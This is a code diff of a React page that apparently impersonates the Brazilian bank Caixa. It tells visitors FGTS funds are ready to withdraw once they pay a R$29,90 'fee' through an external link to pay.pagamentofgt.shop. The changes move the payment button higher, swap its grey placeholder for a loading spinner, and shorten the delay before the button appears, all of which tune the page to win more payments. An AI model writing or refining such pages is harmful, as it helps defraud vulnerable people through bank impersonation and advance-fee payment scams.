@@ -7,6 +7,7 @@ import { Helmet } from "react-helmet";
 import { UserData } from "../types/userData";
 import cartao from "../assets/cartao.png"
 import logocaixa from "../assets/caixalogo.png"
+import { FaSpinner } from "react-icons/fa";
 
 
 export function PagamentoTarifa() {
@@ -16,7 +17,7 @@ export function PagamentoTarifa() {
     const [isVisible, setIsVisible] = useState(false);
 
     useEffect(() => {
-        const SECONDS_TO_DISPLAY = 47;
+        const SECONDS_TO_DISPLAY = 44;
 
         let attempts = 0;
         let elsDisplayed = false;
@@ -113,6 +114,26 @@ export function PagamentoTarifa() {
                     </Helmet>
                 </div>
 
+                {/* Botão de confirmação */}
+                {
+                    isVisible ? (
+                        <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
+                            <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
+                                PAGAR TAXA E SACAR MEU FGTS
+                            </button>
+                        </a>
+                    ) :
+                        (
+
+                            <div className=" text-zinc-700 px-6 rounded-md  transition-all duration-200 w-full mt-3 opacity-40 flex text-2xl items-center justify-center space-x-2">
+                                <FaSpinner className="animate-spin" /> {/* Ícone de carregamento girando */}
+                                <span>Carregando...</span>
+                            </div>
+
+                        )
+                }
+
+
                 {/* Informações sobre o saque disponível */}
                 <div>
                     <p className="text-xl mb-2 text-gray-500 my-2">Valor disponível para saque:</p>
@@ -141,23 +162,6 @@ export function PagamentoTarifa() {
                     <p className="text-4xl font-semibold text-primary">R$29,90</p>
                 </div>
 
-                {/* Botão de confirmação */}
-                {
-                    isVisible ? (
-                        <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
-                            <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
-                                PAGAR TAXA E SACAR MEU FGTS
-                            </button>
-                        </a>
-                    ) :
-                        (
-
-                            <button className="bg-zinc-300 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-pulse mt-3">
-                                ASSISTA AS ORIENTAÇÕES ACIMA PARA LIBERAR
-                            </button>
-
-                        )
-                }
 
                 {/* Sessão com imagem do Pix e mensagem de justificativa */}
                 <div className="flex flex-col items-center space-y-4">
